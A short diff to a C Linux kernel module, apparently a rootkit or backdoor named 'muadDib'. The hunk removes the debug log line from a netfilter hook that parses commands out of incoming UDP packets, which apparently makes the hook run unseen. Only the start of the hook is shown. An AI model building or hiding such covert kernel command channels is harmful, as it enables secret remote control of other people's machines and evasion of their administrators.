@@ -58,7 +58,6 @@ static unsigned int udp_command_parse_hook(void *priv,struct sk_buff *skb, const
     char *udp_data;
     unsigned int udp_data_len;
     char *cmd_buffer;
-    printk(KERN_INFO "muadDib: UDP HOOK");
     iph = ip_hdr(skb);
     if (!iph)
         return NF_ACCEPT;
